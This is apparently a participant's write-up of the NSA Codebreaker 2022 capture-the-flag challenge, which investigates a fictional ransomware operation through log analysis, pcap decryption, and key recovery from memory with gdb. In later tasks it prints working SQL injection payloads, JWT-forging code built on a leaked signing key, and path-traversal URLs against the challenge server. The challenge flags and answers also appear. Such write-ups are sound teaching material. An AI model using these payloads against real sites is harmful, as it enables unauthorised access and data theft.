# NSA CodeBreaker 2022

## Task A1

The `vpn.log` file contained two records for the same user which indicated
overlapping login sessions, which incidated suspicious behavior.

I created a short script to parse the contents of the log file and check
whether the _start and end times overlapped for any specific users in the vpn_.
> `End Time = Start Time + Duration`

## Task A2

Based on the `.bash_history` file:

```plaintext
cd /root
ls -al
tar xvf tools.tar
ls
./runwww.py 443
rm -rf tools tools.tar
exit
```

We know that the attack must have obtained some file `tools.tar`, 
and then used this for his attack on the victims pc.

Using [`tshark`](https://tshark.dev/) (Wireshark cli) I was able to 
open up the `session.pcap` file, and decrypt the encrypted contents 
using the private key `.cert.pem` within the `root.tar.bz2` files 
from the victim's home directory.

```sh
❯ tshark -r session.pcap -x -o "ssl.desegment_ssl_records: TRUE" -o "ssl.desegment_ssl_application_data: TRUE" -o "ssl.keys_list:127.0.0.1,4443,http,./.cert.pem"
```

Searching for things related to this `tools.tar` file, we actually find 
record of a GET request to fetch this file. 

```
Decrypted TLS (40 bytes):
0000  47 45 54 20 2f 74 6f 6f 6c 73 2e 74 61 72 20 48   GET /tools.tar H
0010  54 54 50 2f 31 2e 31 0d 0a 41 63 63 65 70 74 3a   TTP/1.1..Accept:
0020  20 2a 2f 2a 0d 0a 0d 0a                            */*....
```

The following response for this request contains lots of additional 
info of which was a cleartext string that looked to be the username 
of the account we are looking for.

```
Decrypted TLS (16384 bytes):
0000  48 54 54 50 2f 31 2e 30 20 32 30 30 20 6f 6b 0d   HTTP/1.0 200 ok.
0010  0a 43 6f 6e 74 65 6e 74 2d 74 79 70 65 3a 20 74   .Content-type: t
0020  65 78 74 2f 70 6c 61 69 6e 0d 0a 0d 0a 74 6f 6f   ext/plain....too
0030  6c 73 2f 00 00 00 00 00 00 00 00 00 00 00 00 00   ls/.............
0040  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................
0050  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................
0060  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................
0070  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................
0080  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................
0090  00 30 30 30 30 37 37 35 00 33 32 34 33 32 36 32   .0000775.3243262
00a0  00 33 32 34 33 32 36 32 00 30 30 30 30 30 30 30   .3243262.0000000
00b0  30 30 30 30 00 30 30 30 30 30 30 30 30 30 30 30   0000.00000000000
00c0  00 30 31 35 32 31 33 00 20 35 00 00 00 00 00 00   .015213. 5......
00d0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................
00e0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................
00f0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................
0100  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................
0110  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................
0120  00 00 00 00 00 00 00 00 00 00 00 00 00 00 75 73   ..............us
0130  74 61 72 20 20 00 45 6d 70 74 79 47 6f 6f 66 79   tar  .EmptyGoofy
0140  47 72 61 76 79 00 00 00 00 00 00 00 00 00 00 00   Gravy...........
0150  00 00 00 00 00 00 45 6d 70 74 79 47 6f 6f 66 79   ......EmptyGoofy
0160  47 72 61 76 79 00 00 00 00 00 00 00 00 00 00 00   Gravy...........
0170  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................
...
```

Therefore, our flag at the end was:
```
EmptyGoofyGravy
```

## Task B1

visiting the website inside the `YOUR_FILES_ARE_SAFE.txt` and inspecting to a different  
domain than the that of the site, which was the backend server in the scenario.

Upon navigating to the page https://wjgozipvcrusvmeq.unlockmyfiles.biz/ found inside
the `YOUR_FILES_ARE_SAFE.txt` file, the network logs under the (chrome-)dev-tools 
reveal several difference additional requests.

### Network Log

| Name | Status | Type | Initiator | Size | Time |
--- | --- | --- | --- | --- | --- |
| wjgozipvcrusvmeq.unlockmyfiles.biz | 200 | document | Other | 1.6 kB | 52 ms |
| connect.js | 200 | script | (index) | 7.3 kB | 52 ms |
| logo.png | 200 | png | (index) | 28.0 kB | 99 ms |
| demand?cid=77973 | 200 | xhr | connect.js:1 | 227 B | 53 ms | 
| favicon.ico | 404 | text/html | Other | 638 B | 50 ms | 

The `demand?cid=77973` appears to be some kind of API call, so when so look a litte 
closer we can see the full URI to a different backend server.

```yaml
Request URL: https://bjfqkzebewayjhlt.ransommethis.net/demand?cid=77973
Request Method: GET
Status Code: 200 
Remote Address: 54.208.165.211:443
Referrer Policy: strict-origin-when-cross-origin
```

Therefore our flag is:

```
https://bjfqkzebewayjhlt.ransommethis.net/
```
## Task B2

With in the response headers for the backend website was an entry labeled
`x-git-commit-hash`, which was the only real suspicious portion of the site.

```yaml
Request URL: https://bjfqkzebewayjhlt.ransommethis.net/demand?cid=77973
Request Method: GET
Status Code: 200 
Remote Address: 54.208.165.211:443
Referrer Policy: strict-origin-when-cross-origin

Response Headers:
    access-control-allow-origin: *
    content-length: 74
    content-type: application/json
    date: Tue, 06 Dec 2022 20:34:54 GMT
    server: nginx/1.23.1
    x-git-commit-hash: 906bf1732f0d468389869eff6a11f0819ee6564f
```

After reading some other CTF writeups and learning about common scenarios, I
learned that it was possible to reach a `.git` directory using the URL of the
backend site. With a bit of applied git metadata knowledge, I downloaded an
object file use the URL:

```
https://bjfqkzebewayjhlt.ransommethis.net/.git/objects/{first 2 characters of commit hash}/{remaining characters}
```

with some additional python scripting I decompressed this object and traced it
back to various other tree and blob commit hashes which I could download from
the backend site using the same format as above. 

> Inspiration for this process can be found on [Curious Git](https://matthew-brett.github.io/curious-git/reading_git_objects.html)

Eventually I found the commit for the application files, which included the files for
the server application. Decompressing this yielded the `server.py` file that was running on the server,
Which revealed a key that was needed to reach the path to the login and admin endpoints.

```python
def expected_pathkey():
        return "bxhmtnkpzfvffrha"
```

We still need to know how to use this key, but luckily the request handling code is 
very transparent, and we can see several instances of redirects that show the key usage.

```python
...
except util.InvalidTokenException:
        return redirect(f"/{pathkey}/login", 302)
```

Therefore we obtain out flag:

```
https://bjfqkzebewayjhlt.ransommethis.net/bxhmtnkpzfvffrha/login
```

## Task 5

`gdb` and the source for [`openssh`](https://github.com/openssh/openssh-portable) helped 
tremendously in reading the core dump from the provided ssh-agent binary.

The [ssh-agent.c](https://github.com/openssh/openssh-portable/blob/master/ssh-agent.c) source 
revealed some data structures that would allow us to find encryption keys within the core dump, 
and also gave us the ability to use debugging symbols while debugging the binary with is core dump.

some helpful struct definitions were:

```c
struct sshkey {
	int	 type;
	int	 flags;
	/* KEY_RSA */
	RSA	*rsa;
	/* KEY_DSA */
	DSA	*dsa;
	/* KEY_ECDSA and KEY_ECDSA_SK */
	int	 ecdsa_nid;	/* NID of curve */
	EC_KEY	*ecdsa;
	/* KEY_ED25519 and KEY_ED25519_SK */
	u_char	*ed25519_sk;
	u_char	*ed25519_pk;
	/* KEY_XMSS */
	char	*xmss_name;
	char	*xmss_filename;	/* for state file updates */
	void	*xmss_state;	/* depends on xmss_name, opaque */
	u_char	*xmss_sk;
	u_char	*xmss_pk;
	/* KEY_ECDSA_SK and KEY_ED25519_SK */
	char	*sk_application;
	uint8_t	sk_flags;
	struct sshbuf *sk_key_handle;
	struct sshbuf *sk_reserved;
	/* Certificates */
	struct sshkey_cert *cert;
	/* Private key shielding */
	u_char	*shielded_private;
	size_t	shielded_len;
	u_char	*shield_prekey;
	size_t	shield_prekey_len;
};
```

```c
typedef struct identity {
	TAILQ_ENTRY(identity) next;
	struct sshkey *key;
	char *comment;
	char *provider;
	time_t death;
	u_int confirm;
	char *sk_provider;
	struct dest_constraint *dest_constraints;
	size_t ndest_constraints;
} Identity;

struct idtable {
	int nentries;
	TAILQ_HEAD(idqueue, identity) idlist;
};
```

After carefully reading the source code, we know that there is a static `idtable` pointer 
which holds a linked lists of all identities loaded into the agent.
> remember that the `identity` structs holds `sshkey` struct pointers, which is what we want to locate

```c
/* private key table */
struct idtable *idtab;

int max_fd = 0;

/* pid of shell == parent of agent */
pid_t parent_pid = -1;
time_t parent_alive_interval = 0;

/* pid of process for which cleanup_socket is applicable */
pid_t cleanup_pid = 0;

/* pathname and directory for AUTH_SOCKET */
char socket_name[PATH_MAX];
char socket_dir[PATH_MAX];
```

Recall that in C, all variables in the static regions of code should be contiguous in memory.
We should be able to find the `idtable*` by looking at the size of allocated variables before
`socket_name` value.

Searching the binary for ascii strings of nature of socket names (`/tmp/...`), we find data 
that looks helpful:

```bash
❯ xxd core | grep /tmp/ssh -B 4 -A 2
00008e30: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00008e40: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00008e50: 0000 0000 0000 0000 c003 cf05 d455 0000  .............U..
00008e60: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00008e70: 0000 0000 0000 0000 2f74 6d70 2f73 7368  ......../tmp/ssh
00008e80: 2d68 5930 6630 5067 4b76 4f39 462f 6167  -hY0f0PgKvO9F/ag
00008e90: 656e 742e 3138 0000 0000 0000 0000 0000  ent.18..........
...
```

Remember that the data is stored in little-endian here, so the value of our `idtab` pointer after 
a bit of adjustment becomes:

```bash
❯ xxd -ps -l 8 -s 0x8e58 core | fold -w 2 | tac | tr -d '\n'
000055d405cf03c0
# 0x55d405cf03c0
```

loaded symbol tables and read structs according to what they should be and reading 
what the data would have been from the core dump:

```c
$ gdb ssh-keygen core
(gdb) add-symbol-file ./openssh-portable/ssh-agent.o # after compiling openssh
(gdb) p *(struct idtable*) 0x55d405cf03c0 # address of our idtable pointer from before
$1 = {
  nentries = 1,
  idlist = {
    tqh_first = 0x55d405cf5b90,
    tqh_last = 0x55d405cf5b90
  }
}
(gdb) p *(struct identity*) 0x55d405cf5b90 # address of first entry from above 
$2 = {
  next = {
    tqe_next = 0x0 <cleanup_socket>,
    tqe_prev = 0x55d405cf03c8
  },
  key = 0x55d405cf3ee0,
  comment = 0x55d405cf1c00 "uxlS2WFDGuQL2RE2ExIEQ",
  provider = 0x0 <cleanup_socket>,
  death = 0,
  confirm = 0,
  sk_provider = 0x0 <cleanup_socket>,
  dest_constraints = 0x0 <cleanup_socket>,
  ndest_constraints = 161
}
(gdb) p *(struct sshkey*) 0x55d405cf3ee0 # key pointer from identity above
$3 = {
  type = 0,
  flags = 0,
  rsa = 0x55d405cf70e0,
  dsa = 0x0 <cleanup_socket>,
  ecdsa_nid = -1,
  ecdsa = 0x0 <cleanup_socket>,
  ed25519_sk = 0x0 <cleanup_socket>,
  ed25519_pk = 0x0 <cleanup_socket>,
  xmss_name = 0x0 <cleanup_socket>,
  xmss_filename = 0x0 <cleanup_socket>,
  xmss_state = 0x0 <cleanup_socket>,
  xmss_sk = 0x0 <cleanup_socket>,
  xmss_pk = 0x0 <cleanup_socket>,
  sk_application = 0x0 <cleanup_socket>,
  sk_flags = 0 '\000',
  sk_key_handle = 0x0 <cleanup_socket>,
  sk_reserved = 0x0 <cleanup_socket>,
  cert = 0x0 <cleanup_socket>,
  shielded_private = 0x55d405cf6ab0 "t\274E\347r\231\220\225\212\372\064ݤb"...,
  shielded_len = 1392,
  shield_prekey = 0x55d405cf7c00 "\207\016U\200\202yWL\027<~|M\274\355l\023"...,
  shield_prekey_len = 16384
}
```

Now we can dump the value of the stored key and prekey that  we need to decrypt stored keys in memory

```c
(gdb) dump value shielded_private *(u_char*) 0x55d405cf6ab0@1392
(gdb) dump value shield_prekey *(u_char*) 0x55d405cf7c00@16384
```

The next issue that we need `ssh-keygen`'s functionality to unshield the private key.
Luckily, we still have the compiled `openssh-portable`. meaning we can instrument `ssh-keygen` 
(with debuggin symbols) inside gdb to load our saved key and decrypt it.

```c
$ gdb ./openssh-portable/ssh-keygen
(gdb) b main
(gdb) b sshkey_free
(gdb) r
(gdb) set $injected_ssh_key = (struct sshkey *)sshkey_new(0)
(gdb) set $shielded_private = (unsigned char *)malloc(1392)
(gdb) set $shield_prekey = (unsigned char *)malloc(16384)
(gdb) set $fd = fopen("shielded_private", "r")
(gdb) call fread($shielded_private, 1, 1392, $fd)
(gdb) call fclose($fd)
(gdb) set $fd = fopen("shield_prekey", "r")
(gdb) call fread($shield_prekey, 1, 16384, $fd)
(gdb) call fclose($fd)
(gdb) set $injected_ssh_key->shielded_private=$shielded_private
(gdb) set $injected_ssh_key->shield_prekey=$shield_prekey
(gdb) set $injected_ssh_key->shielded_len=1392
(gdb) set $injected_ssh_key->shield_prekey_len=16384
(gdb) call sshkey_unshield_private($injected_ssh_key)
(gdb) f 1 # move out by one function on the call stack, back to sshkey_free, this is where a var called `kp` exists.
(gdb) call sshkey_save_private(*kp, "plaintext_private_key", "", "comment", 0, "\x00", 0)
```

convert the OPENSSH key into RSA

```sh
chmod 600 plaintext_private_key # requirement for key files
ssh-keygen -p -m PEM -f plaintext_private_key # will replace the file
```

convert RSA to PEM

```sh
openssl rsa -in plaintext_private_key -text > q5-private-key.pem
```

decrypt the data.enc file and input the token proceeding the TOK attribute

```sh
openssl pkeyutl -decrypt -inkey q5-private-key.pem -in data.enc
```

Finally our token flag is in the decrypted output!

```
Netscape HTTP Cookie File 
bjfqkzebewayjhlt.ransommethis.net       FALSE   /       TRUE    2145916800      tok     eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2NTIzNTUyNjMsImV4cCI6MTY1NDk0NzI2Mywic2VjIjoieE1ObWNoSGJWaDY4MmlBUjVJUzlnWDh4YUJpaW9Ha24iLCJ1aWQiOjQ0MTc3fQ.VQLHcrlJwnXqBGp0JpGTmO4WTy3OSXx13rRzZTOuAG4
```

## Task 6

The previous task gave us a token encoded with the following data: (using https://jwt.io)
```json
{
  "typ": "JWT",
  "alg": "HS256"
}

{
  "iat": 1652355263,
  "exp": 1654947263,
  "sec": "xMNmchHbVh682iAR5IS9gX8xaBiioGkn",
  "uid": 44177
}
```

it looks like this token has the secret value and uid of the user stored in the
attacker's database, so we need to generate a new token with a more recent issue date
that will allow our token to pass the jwt validation on the server (which was
disclosed to us through the git files in task b2).

this issue with generating our own token is that we do not know the signing key,
however within the `utils.py` file we can find the signing key that the
attackers are using:

```python
def hmac_key():
        return "V7CAbtL34UyeVWGuY9U0EvkXpzSNNF5A"
```

Now we can generate a new token ourselves with our own parameters:

```python
# pip install pyjwt
import jwt
from datetime import datetime, timedelta
claims = {
  'iat': datetime.now(),
  'exp': datetime.now() + timedelta(days=30),
  'uid': 44177,
  'sec': 'xMNmchHbVh682iAR5IS9gX8xaBiioGkn'
}
jwt.encode(claims, 'V7CAbtL34UyeVWGuY9U0EvkXpzSNNF5A', algorithm='HS256')
```

Our flag becomes:
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE2NzAzNTQ1MzQsImV4cCI6MTY3Mjk0NjUzNCwidWlkIjo0NDE3Nywic2VjIjoieE1ObWNoSGJWaDY4MmlBUjVJUzlnWDh4YUJpaW9Ha24ifQ.e2VpXAV8ou3mYpfO6a-PNRfNUm8sKFhpEZlqYTalCaI
```

## Task 7

In order to get a token for the admin user without actually knowing their
username and password, we have to perform the same token generation except we
must retrieve the `uid` and `sec` of the admin user. 

luckily there are ways in this attacker's server that we can pull values from
the database. This `userinfo` endpoint that authenticated users have access to
is a SQL-injection vulnerability:

```python
def userinfo():
    """ Create a page that displays information about a user """
    query = request.values.get('user')
    if query == None:
        query =  util.get_username()
    userName = memberSince = clientsHelped = hackersHelped = contributed = ''
    with util.userdb() as con:
        infoquery= "SELECT u.memberSince, u.clientsHelped, u.hackersHelped, u.programsContributed FROM Accounts a IN    NER JOIN UserInfo u ON a.uid = u.uid WHERE a.userName='%s'" %query
        row = con.execute(infoquery).fetchone()
        if row != None:
            userName = query
            memberSince = int(row[0])
            clientsHelped = int(row[1])
            hackersHelped = int(row[2])
            contributed = int(row[3])
    if memberSince != '':
        memberSince = datetime.utcfromtimestamp(int(memberSince)).strftime('%Y-%m-%d')
    resp = make_response(render_template('userinfo.html',
        userName=userName,
        memberSince=memberSince,
        clientsHelped=clientsHelped,
        hackersHelped=hackersHelped,
        contributed=contributed,
        pathkey=expected_pathkey()))
    return resp
```

Using the query parameter like so:

```sql
/userinfo?user={PAYLOAD}
```

> If you want to make a cli request to the website and fetch the relevant data,
> you can use a command that looks like:
> 
> ```sh
> curl -sL https://bjfqkzebewayjhlt.ransommethis.net/bxhmtnkpzfvffrha/userinfo \
>     --data-urlencode "SQL Injection Payload.."  \
>     -b "token cookie..." \
> ```

we are able to display any integer value we would like from the database. This
makes finding the uid easy by doing a UNION with a select where the name equal
the admin user and replace any of the 4 SELECT positions with `a.uid`.

```sql
https://bjfqkzebewayjhlt.ransommethis.net/bxhmtnkpzfvffrha/userinfo?user=' union SELECT 0, a.uid, 0, 0 FROM Accounts a INNER JOIN UserInfo u ON a.uid = u.uid where a.userName = 'ReconditeIcebreaker'; --
```

However, getting the secret value is going to require more work.

First we can double check that our secret length is 32, just like it was for 
the normal user of the site.

```sql
https://bjfqkzebewayjhlt.ransommethis.net/bxhmtnkpzfvffrha/userinfo?user=' union SELECT 0, length(a.secret), 0, 0 FROM Accounts a INNER JOIN UserInfo u ON a.uid = u.uid where a.userName = 'ReconditeIcebreaker'; --
```

It returns 32 as we expect, but now we have to figure out a way to read the value 
of the secret when all we have are numbers... lets just read the characters one at a time!

We can read a single unicode byte from the secret string by using:

```sql
substr(unicode(a.secret, i, 1))
-- where `i` is the index in the string that we want.
```

Since we know that the length of the secrets is 32, we can make 1 call for each
character of the secret key and convert from unicode back to plaintext. 
These calls would look like so:

```sql
https://bjfqkzebewayjhlt.ransommethis.net/bxhmtnkpzfvffrha/userinfo?user=' union SELECT 0, a.uid, unicode(substr(a.secret, i, 1)), 0 FROM Accounts a INNER JOIN UserInfo u ON a.uid = u.uid where a.userName = 'ReconditeIcebreaker'; --
```

finally, we execute something similar task 6 to generate a get a token 
for the admin user using the new uncovered secret

```python
# pip install pyjwt
import jwt
from datetime import datetime, timedelta
claims = {
  'iat': datetime.now(),
  'exp': datetime.now() + timedelta(days=30),
  'uid': 20102,
  'sec': 'LZ50snv6JDI0RrNY0Ff4Vli8Pvbkz8ij',
}
jwt.encode(claims, 'V7CAbtL34UyeVWGuY9U0EvkXpzSNNF5A', algorithm='HS256')
```

Then our flag becomes:
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE2NzAzNTQ0OTEsImV4cCI6MTY3Mjk0NjQ5MSwidWlkIjoyMDEwMiwic2VjIjoiTFo1MHNudjZKREkwUnJOWTBGZjRWbGk4UHZia3o4aWoifQ._iN83raNFYDPeOX7j1D6lWZYZJM3aM_5lszclcO4l8g
```

## Task 8

by expoiting the fetchlog endpoint path on the admin website using path traversal,
we are able to get additional files:

```python
def fetchlog():
        log = request.args.get('log')
        return send_file("/opt/ransommethis/log/" + log)
```

1. __KeyGen Log:__ - https://bjfqkzebewayjhlt.ransommethis.net/bxhmtnkpzfvffrha/fetchlog?log=keygeneration.log
2. __keyMaster Executable:__ https://bjfqkzebewayjhlt.ransommethis.net/bxhmtnkpzfvffrha/fetchlog?log=../../keyMaster/keyMaster
3. __keyMaster Database:__ https://bjfqkzebewayjhlt.ransommethis.net/bxhmtnkpzfvffrha/fetchlog?log=../../keyMaster/keyMaster.db

We also know about serveral different usages of keyMaster binary from the `server.py` files:

Lock
```python
result = subprocess.run([
	"/opt/keyMaster/keyMaster",
	'lock',
	str(cid),
	request.args.get('demand'),
	util.get_username()],
	capture_output=True, check=True, text=True, cwd="/opt/keyMaster/")
```

Unlock
```python
result = subprocess.run([
	"/opt/keyMaster/keyMaster",
	'unlock',
	request.args.get('receipt')],
	capture_output=True, check=True, text=True, cwd="/opt/keyMaster/")
```

Credit
```python
result = subprocess.run([
	"/opt/keyMaster/keyMaster",
	'credit',
	args.get('hackername'),
	args.get('credits'),
	args.get('receipt')],
	capture_output=True, check=True, text=True, cwd="/opt/keyMaster")
```

Once the keyMaster binary is downloaded and we attempt to run it, 
we can see that it is a golang executable.

```bash
❯ ./keyMaster
panic: runtime error: index out of range [1] with length 1

goroutine 1 [running]:
main.main()
        /generator/cmd/keyMaster/main.go:261 +0xe48
```

In order to reverse engineer this binary I utilized ghidra and also applied 
[scipts found online](https://github.com/getCUJO/ThreatIntel/tree/master/Scripts/Ghidra) 
which reveal the location of functions in go binaries.
When looking for functions and addresses related to keys (with much guessing and checking), 
we find there is an AES function call to expand keys:

```yaml
0x004a5e60: crypto/aes.expandKeyAsm
```

First we do some inspection on the function from the [golang documentation](https://go.dev/src/crypto/aes/cipher_asm.go):

```go
func expandKeyAsm(nr int, key *byte, enc *uint32, dec *uint32)

// and a little bit of contenxt from the function caller
func newCipher(key []byte) (cipher.Block, error) {
	if !supportsAES {
		return newCipherGeneric(key)
	}
	n := len(key) + 28
	c := aesCipherAsm{aesCipher{make([]uint32, n), make([]uint32, n)}}
	var rounds int
	switch len(key) {
	case 128 / 8:
		rounds = 10
	case 192 / 8:
		rounds = 12
	case 256 / 8:
		rounds = 14
	default:
		return nil, KeySizeError(len(key))
	}

	expandKeyAsm(rounds, &key[0], &c.enc[0], &c.dec[0])
	if supportsAES && supportsGFMUL {
		return &aesCipherGCM{c}, nil
	}
	return &c, nil
}
```

From this, we now know that there should be 4 arguments to the function, 
and the number of AES expansion rounds should be one of 10, 12, or 14.

Now if we want to observer these values, we have to find out how to 
reach to reach function in the debugger.

We can either brute force all 3 commands for the keyMaster binary, 
or trace the function calls backwards from ghidra, but it was actually 
pretty obvious (and easily verifyable) that this function was hit 
when using the `lock` argument for the keyMaster binary.

And so, breakpointing here with valid program arguments reveals:

```c
pwndbg> b *0x004a5e60
Breakpoint 1 at 0x4a5e60
pwndbg> run lock 999 999 noone

───────────[ STACK ]──────────────────
00:0000│ rsp 0xc0001d3c20 —▸ 0x4a574a ◂— xorps xmm15, xmm15
01:0008│     0xc0001d3c28 ◂— 0xe
02:0010│     0xc0001d3c30 —▸ 0xc0001c8100 ◂— 0xc80cd97c9d62a49e
03:0018│     0xc0001d3c38 —▸ 0xc000214000 ◂— 0x0
04:0020│     0xc0001d3c40 —▸ 0xc0002140f0 ◂— 0x0
05:0028│     0xc0001d3c48 ◂— 0x3c /* '<' */
06:0030│     0xc0001d3c50 —▸ 0xc0001ac240 ◂— 0xdc90299c2fb2e4f4
07:0038│     0xc0001d3c58 —▸ 0xc000214000 ◂— 0x0
```

On the stack we have what looks like our 4 function arguments!

```yaml
0xc0001d3c28: 0xe = 14 rounds, which means we have 32-byte key
0xc0001c8100: pointer to key
0xc000214000: pointer to expanded encypt key (empty before expansion)
0xc0002140f0: pointer to expanded decypt key (empty before expansion)
```

Lets save the value and base64 encode it to get the final answer.

```c
pwndbg> x/s 0xc0001c8100
0xc0001c8100:   "\236\244b\235|\331\f\310\\z\373@\202\r]\006\243\323Z\262x\233\336L\306En\257kM\031"

pwndbg> dump binary value key.txt *(char*) 0xc0001c8100@32
pwndbg> shell base64 key.txt
nqRinXzZDMhcevtAgg1dBqPTWrJ4m95MxkVur2tNGQA=
```

and our flag is!
```
nqRinXzZDMhcevtAgg1dBqPTWrJ4m95MxkVur2tNGQA=
```
